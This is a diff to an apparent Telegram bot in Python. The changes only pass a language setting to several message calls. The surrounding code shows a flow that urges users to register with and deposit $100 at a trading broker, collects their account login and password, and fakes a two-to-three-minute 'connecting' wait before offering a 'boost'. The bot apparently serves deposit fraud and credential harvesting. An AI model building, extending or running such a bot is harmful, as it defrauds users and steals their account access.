@@ -424,7 +424,8 @@ async def _verify_pocket_option_registration(message: types.Message, state: FSMC
             message=message_to_reply,
             photo_name="succes but you nidde ddeposidd 100$.jpg",
             text=_msg("pocket_option_registered_success", message_to_reply.from_user.id).format(min_deposit=min_deposit),
-            reply_markup=get_funded_keyboard(_get_user_lang(message_to_reply.from_user.id))
+            reply_markup=get_funded_keyboard(_get_user_lang(message_to_reply.from_user.id)),
+            lang=_get_user_lang(message_to_reply.from_user.id)
         )
         await state.set_state(UserFlow.pocket_option_funding)
         return
@@ -449,7 +450,8 @@ async def _verify_pocket_option_registration(message: types.Message, state: FSMC
             message=message_to_reply,
             photo_name="error not foud your account.jpg",
             text=_msg("registration_check_failed", message_to_reply.from_user.id), # This message doesn't need min_deposit
-            reply_markup=get_pocket_option_retry_keyboard(_get_user_lang(message_to_reply.from_user.id))
+            reply_markup=get_pocket_option_retry_keyboard(_get_user_lang(message_to_reply.from_user.id)),
+            lang=_get_user_lang(message_to_reply.from_user.id)
         )
         await state.set_state(UserFlow.pocket_option_retry)
         return
@@ -462,7 +464,8 @@ async def _verify_pocket_option_registration(message: types.Message, state: FSMC
         message=message_to_reply,
         photo_name="succes but you nidde ddeposidd 100$.jpg",
         text=_msg("pocket_option_registered_success", message_to_reply.from_user.id).format(min_deposit=min_deposit),
-        reply_markup=get_funded_keyboard(_get_user_lang(message_to_reply.from_user.id))
+        reply_markup=get_funded_keyboard(_get_user_lang(message_to_reply.from_user.id)),
+        lang=_get_user_lang(message_to_reply.from_user.id)
     )
     await state.set_state(UserFlow.pocket_option_funding)
 
@@ -480,7 +483,8 @@ async def _verify_pocket_option_deposit(message: types.Message, state: FSMContex
             message=message,
             photo_name="gread need yuor lign password.jpg",
             text=_msg("pocket_option_verification_successful", message.from_user.id),
-            reply_markup=None
+            reply_markup=None,
+            lang=_get_user_lang(message.from_user.id)
         )
         await state.set_state(UserFlow.pocket_option_login_input)
         return
@@ -527,7 +531,8 @@ async def _verify_pocket_option_deposit(message: types.Message, state: FSMContex
             message=message,
             photo_name="gread need yuor lign password.jpg",
             text=_msg("pocket_option_verification_successful", message.from_user.id),
-            reply_markup=None
+            reply_markup=None,
+            lang=_get_user_lang(message.from_user.id)
         )
         await state.set_state(UserFlow.pocket_option_login_input)
     else:
@@ -545,7 +550,8 @@ async def _verify_pocket_option_deposit(message: types.Message, state: FSMContex
             message=message,
             photo_name=photo,
             text=text,
-            reply_markup=get_funded_keyboard(_get_user_lang(message.from_user.id))
+            reply_markup=get_funded_keyboard(_get_user_lang(message.from_user.id)),
+            lang=_get_user_lang(message.from_user.id)
         )
 
 # Robust parser for credentials: supports labeled and free-form input
@@ -716,7 +722,8 @@ async def pocket_option_login_input_handler(message: types.Message, state: FSMCo
             message=message,
             photo_name="waitng to connect account.jpg",
             text=_msg("pocket_option_connecting", message.from_user.id),
-            reply_markup=None
+            reply_markup=None,
+            lang=_get_user_lang(message.from_user.id)
         )
         # Change sleep to 2-3 minutes
         await asyncio.sleep(random.randint(120, 180))
@@ -727,7 +734,8 @@ async def pocket_option_login_input_handler(message: types.Message, state: FSMCo
             photo_name="succes connected.jpg",
             text=_msg("pocket_option_connected_ready", message.from_user.id),
             reply_markup=get_pocket_option_start_boost_keyboard(_get_user_lang(message.from_user.id)),
-            edit=True # Add this flag
+            edit=True,
+            lang=_get_user_lang(message.from_user.id)
         )
         
         await state.set_state(UserFlow.pocket_option_ready_to_boost)
